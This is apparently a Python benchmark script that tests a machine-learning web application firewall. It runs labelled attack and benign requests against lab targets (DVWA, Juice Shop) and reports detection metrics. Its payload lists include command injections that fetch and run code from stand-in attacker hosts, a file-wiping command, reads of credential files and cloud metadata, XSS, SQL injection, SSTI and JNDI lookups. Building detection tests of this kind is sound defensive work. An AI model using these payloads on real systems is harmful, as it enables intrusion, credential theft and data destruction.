import json
import os
import sys
from urllib.parse import quote, quote_plus
import numpy as np

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
import data
import model as M

# Initialize Scorer
S = M.Scorer(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'model'))
threshold = S.threshold
print(f"Loaded WAF Scorer (Threshold: {threshold})")

# ==============================================================================
# COMPREHENSIVE NETWORK & WEB SECURITY ATTACK DATASET
# ==============================================================================
CATEGORIES = {
    "SQLi (Classic & Union)": [
        "' OR 1=1--",
        "' OR '1'='1",
        "admin'--",
        "1' UNION SELECT 1,version(),user()-- -",
        "1; DROP TABLE users;--",
        "-1 UNION SELECT NULL,schema_name FROM information_schema.schemata--",
        "') UNION ALL SELECT NULL,NULL,table_name FROM all_tables--",
        "admin' OR 1=1#",
        "1' AND 1=0 UNION SELECT NULL,sql FROM sqlite_master WHERE type='table'--"
    ],
    "SQLi (Blind & Time-Based)": [
        "1' AND SLEEP(5)--",
        "1' AND (SELECT 1 FROM pg_sleep(5))--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--",
        "1' ORDER BY 100--",
        "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "1' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))--"
    ],
    "SQLi (Obfuscations & Evasions)": [
        "1'/**/UN/**/ION/**/SEL/**/ECT/**/1,2--",
        "1%2527%2520OR%25201%253D1--",
        "1%0aUNION%0aSELECT%0a1,2,3--",
        "1' || (SELECT 'a') || '",
        "0x27204f5220313d312d2d",
        "1' AND %23%0A1=1--",
        "1;EXEC('d'+'ir')--",
        "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
        "1' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)--"
    ],
    "XSS (Cross-Site Scripting)": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg onload=alert(document.domain)>",
        "<iframe src=\"javascript:alert(`XSS`)\">",
        "<body onload=prompt(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<object data=\"javascript:alert(1)\">",
        "\"onmouseover=\"alert(1)",
        "'-alert(1)-'",
        "<script src=\"https://evil.attacker.com/hook.js\"></script>",
        "<svg><animate onbegin=alert() attributeName=x dur=1s>"
    ],
    "XSS (Filter Bypasses & Polyglots)": [
        "<sCrIpt>alert(1)</ScRipt>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
        "<img/src=x/onerror=alert(1)>",
        "<svg/onload=confirm(1)>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;"
    ],
    "Path Traversal & LFI/RFI": [
        "../../../../etc/passwd",
        "../../../../../../windows/system32/drivers/etc/hosts",
        "..\\..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..;/..;/..;/etc/passwd",
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
        "file:///etc/passwd",
        "../../../../etc/passwd%00.png"
    ],
    "Command Injection (RCE)": [
        "; cat /etc/passwd",
        "| whoami",
        "& dir",
        "&& id",
        "|| ping -c 4 127.0.0.1",
        "`whoami`",
        "$(id)",
        "; curl http://attacker.com/malware.sh | bash",
        "; rm -rf /var/www/html/*",
        "%0aid",
        "%0a/bin/cat%20/etc/passwd",
        "& type c:\\windows\\win.ini",
        "; powershell.exe -NoP -NonI -Command (New-Object Net.WebClient).DownloadString('http://attacker/x')",
        "; cat$IFS/etc/passwd",
        "| echo${IFS}test",
        "; sleep 10"
    ],
    "SSRF (Cloud Metadata & Localhost)": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://127.0.0.1:8080/admin",
        "http://localhost:22",
        "http://0.0.0.0:80/",
        "http://[::1]:8080/",
        "http://2130706433/",
        "http://0177.0.0.1/",
        "http://127.1/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20key%20val",
        "dict://127.0.0.1:11211/stat"
    ],
    "SSTI & Code Injection": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}",
        "{{_self.env.registerUndefinedFilterCallback(\"exec\")(\"id\")}}"
    ],
    "Log4Shell & JNDI / XXE": [
        "${jndi:ldap://attacker.com/a}",
        "${jndi:rmi://attacker.com/jndi}",
        "${jndi:dns://attacker.com/log4j}",
        "${${lower:j}ndi:ldap://attacker.com/a}",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "${env:AWS_SECRET_ACCESS_KEY}"
    ],
    "NoSQL & LDAP Injection": [
        "{\"$ne\": null}",
        "{\"$gt\": \"\"}",
        "{\"$where\": \"sleep(5000)\"}",
        "admin'||1==1//",
        "*)(uid=*))(|(uid=*",
        "admin*)(|(password=*))"
    ],
    "Recon & Sensitive Asset Probes": [
        "/.env",
        "/.env.local",
        "/.git/config",
        "/.git/HEAD",
        "/.svn/entries",
        "/wp-config.php.bak",
        "/config.inc.php.bak",
        "/backup.sql",
        "/db.sql",
        "/server-status",
        "/phpinfo.php",
        "/administrator",
        "/phpmyadmin/",
        "/pma/",
        "/actuator/env",
        "/swagger-ui.html",
        "/shell.php",
        "/.aws/credentials"
    ],
    "Scanner & Exploitation User-Agents": [
        ("Nikto/2.1.6", "GET /index.php"),
        ("sqlmap/1.8#stable", "GET /index.php"),
        ("nuclei - Open-source project", "GET /index.php"),
        ("masscan/1.3", "GET /"),
        ("WPScan v3.8.22", "GET /index.php"),
        ("DirBuster-1.0-RC1", "GET /index.php"),
        ("Gobuster/3.1.0", "GET /index.php"),
        ("python-requests/2.31.0", "GET /index.php"),
        ("Hydra", "GET /login.php"),
        ("Acunetix-Product", "GET /index.php"),
        ("BurpSuite/Pro", "GET /index.php"),
        ("Mozilla/5.0 (compatible; Nmap Scripting Engine)", "GET /")
    ]
}

BENIGN_HARD_SAMPLES = [
    "GET /rest/products/search?q=apple%20&%20orange%20juice",
    "GET /rest/products/search?q=o'reilly%20books%20and%20guides",
    "GET /rest/products/search?q=c++%20programming%20language",
    "GET /rest/products/search?q=50%%20off%20all%20items",
    "GET /rest/products/search?q=juice%20(500ml)%20bottle",
    "GET /rest/products/search?q=what%20is%20the%20price%20of%20apple%20juice?",
    "GET /rest/products/search?q=sugar-free%20@%20store",
    "GET /vulnerabilities/fi/?page=include.php",
    "GET /security.php?phpids=off",
    "GET /instructions.php?doc=readme",
    "POST /login.php?Login=Login",
    "GET /phpinfo.php?view=summary",
    "POST /rest/user/change-password?current=P@ssw0rd!&new=Strong#Pass123&repeat=Strong#Pass123",
    "GET /redirect?to=https://example.com/oauth/callback?code=abc12345",
    "GET /api/Cards/12?token=tok_visa_4242424242424242",
    "GET /rest/track-order/TRACK-8934-2918-ABCD",
    "GET /api/Products?page=1&limit=50&sort=name_asc&filter=active",
    "GET /rest/basket/5?coupon=SUMMER_2026_SALE",
    "GET /rest/user/security-question?email=sourjya.saha+security@gmail.com",
    "GET /assets/public/images/products/green_tea_lemonade_cold.png"
]

TARGET_SLOTS = [
    "/vulnerabilities/sqli/?id={}&Submit=Submit",
    "/vulnerabilities/xss_r/?name={}",
    "/vulnerabilities/exec/?ip={}&Submit=Submit",
    "/rest/products/search?q={}"
]

test_records = []

# 1. Synthesize threats
for cat, payloads in CATEGORIES.items():
    if cat == "Scanner & Exploitation User-Agents":
        for ua, endpoint in payloads:
            req_str = data.normalize("GET", endpoint, ua=ua, ref="http://localhost/")
            test_records.append({
                "category": cat,
                "payload": ua,
                "endpoint": endpoint,
                "normalized": req_str,
                "is_attack": True
            })
    elif cat == "Recon & Sensitive Asset Probes":
        for path in payloads:
            req_str = data.normalize("GET", path, ua="Mozilla/5.0", ref="http://localhost/")
            test_records.append({
                "category": cat,
                "payload": path,
                "endpoint": path,
                "normalized": req_str,
                "is_attack": True
            })
    else:
        for p in payloads:
            for enc_fn in [quote, quote_plus]:
                enc_p = enc_fn(p)
                for slot in TARGET_SLOTS[:2]:
                    url = slot.format(enc_p)
                    req_str = data.normalize("GET", url, ua="Mozilla/5.0", ref="http://localhost/")
                    test_records.append({
                        "category": cat,
                        "payload": p,
                        "endpoint": url,
                        "normalized": req_str,
                        "is_attack": True
                    })

# 2. Add real DVWA live exploit attacks from log
dvwa_log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'dvwa_logs', 'dvwa_attacks.log')
if os.path.exists(dvwa_log_path):
    with open(dvwa_log_path, 'r', encoding='utf-8') as f:
        dvwa_lines = [l.strip() for l in f if l.strip()]
    for line in dvwa_lines[:250]:
        r = data.parse_line(line)
        if r:
            req_str = data.normalize(*r[:4])
            test_records.append({
                "category": "Real DVWA Live Exploits",
                "payload": r[1],
                "endpoint": r[1],
                "normalized": req_str,
                "is_attack": True
            })

# 3. Add Hard Benign Samples
for req in BENIGN_HARD_SAMPLES:
    parts = req.split(' ', 1)
    m, uri = parts[0], parts[1]
    norm = data.normalize(m, uri, ua="Mozilla/5.0", ref="http://localhost/")
    test_records.append({
        "category": "Benign (Hard Edge-Cases)",
        "payload": uri,
        "endpoint": uri,
        "normalized": norm,
        "is_attack": False
    })

# 4. Add Standard Benign Samples
pure_benign_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'access_dvwa_pure_benign.txt')
if os.path.exists(pure_benign_file):
    clean_dvwa = sorted(data.load_logs([pure_benign_file]))[:100]
    for norm in clean_dvwa:
        test_records.append({
            "category": "Benign (Standard DVWA)",
            "payload": norm,
            "endpoint": norm,
            "normalized": norm,
            "is_attack": False
        })

js_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'juice_shop_logs.txt')
if os.path.exists(js_file):
    clean_js = sorted(data.load_logs([js_file]))[:100]
    for norm in clean_js:
        test_records.append({
            "category": "Benign (Standard Juice Shop)",
            "payload": norm,
            "endpoint": norm,
            "normalized": norm,
            "is_attack": False
        })

print(f"Total test instances: {len(test_records)}")
attacks_count = sum(1 for r in test_records if r["is_attack"])
benign_count = sum(1 for r in test_records if not r["is_attack"])
print(f"  Attack samples: {attacks_count}")
print(f"  Benign samples: {benign_count}")

# Score all test records
all_normalized = [r["normalized"] for r in test_records]
scores = S.score(all_normalized)

for r, s in zip(test_records, scores):
    r["score"] = float(round(s, 4))
    r["predicted_block"] = bool(s >= threshold)
    r["correct"] = (r["predicted_block"] == r["is_attack"])

# Save complete benchmark dataset
output_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'benchmark_threat_matrix.json')
with open(output_file, 'w', encoding='utf-8') as f:
    json.dump(test_records, f, indent=2)
print(f"Saved complete evaluation dataset to {output_file} ({os.path.getsize(output_file)} bytes)")

# ==============================================================================
# DETAILED PERFORMANCE METRICS CALCULATION
# ==============================================================================
categories = sorted(list(set(r["category"] for r in test_records)))

print("\n" + "="*80)
print(f"{'THREAT CATEGORY':<36} | {'N':<5} | {'BLOCKED / FLAGGED':<18} | {'MEDIAN SCORE'}")
print("="*80)

for cat in categories:
    cat_records = [r for r in test_records if r["category"] == cat]
    n = len(cat_records)
    cat_scores = [r["score"] for r in cat_records]
    blocked = sum(1 for r in cat_records if r["predicted_block"])
    rate = (blocked / n) * 100
    med = np.median(cat_scores)
    
    flag_label = f"{blocked}/{n} ({rate:.1f}%)"
    print(f"{cat:<36} | {n:<5} | {flag_label:<18} | {med:.2f}")

print("="*80)

# Confusion Matrix
tp = sum(1 for r in test_records if r["is_attack"] and r["predicted_block"])
fp = sum(1 for r in test_records if not r["is_attack"] and r["predicted_block"])
tn = sum(1 for r in test_records if not r["is_attack"] and not r["predicted_block"])
fn = sum(1 for r in test_records if r["is_attack"] and not r["predicted_block"])

accuracy = (tp + tn) / len(test_records) * 100
precision = tp / (tp + fp) * 100 if (tp + fp) > 0 else 0
recall = tp / (tp + fn) * 100 if (tp + fn) > 0 else 0
f1 = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0

print(f"\nOVERALL CONFUSION MATRIX & ACCURACY (n={len(test_records)}):")
print(f"  True Positives  (Attacks Blocked):      {tp:4d} / {attacks_count} ({recall:.1f}%)")
print(f"  False Negatives (Attacks Slipped):      {fn:4d} / {attacks_count} ({fn/attacks_count*100:.1f}%)")
print(f"  True Negatives  (Benign Allowed):       {tn:4d} / {benign_count} ({tn/benign_count*100:.1f}%)")
print(f"  False Positives (Benign Flagged):       {fp:4d} / {benign_count} ({fp/benign_count*100:.1f}%)")
print("-" * 55)
print(f"  Accuracy:  {accuracy:.2f}%")
print(f"  Precision: {precision:.2f}%")
print(f"  Recall:    {recall:.2f}%")
print(f"  F1-Score:  {f1:.2f}%")
print("-" * 55)

# Inspect Misses (False Negatives)
misses = [r for r in test_records if r["is_attack"] and not r["predicted_block"]]
if misses:
    print(f"\nBLIND SPOTS & EVASION ANALYSIS ({len(misses)} attacks under threshold 1.0):")
    for m in misses[:12]:
        p_clean = m['payload'].replace('\n', ' ')
        print(f"  [{m['category']}] (score: {m['score']:.2f}) -> {p_clean[:60]}")

# Inspect False Positives
fps = [r for r in test_records if not r["is_attack"] and r["predicted_block"]]
if fps:
    print(f"\nFALSE POSITIVES ANALYSIS ({len(fps)} benign requests over threshold 1.0):")
    for f in fps:
        p_clean = f['payload'].replace('\n', ' ')
        print(f"  [{f['category']}] (score: {f['score']:.2f}) -> {p_clean[:60]}")
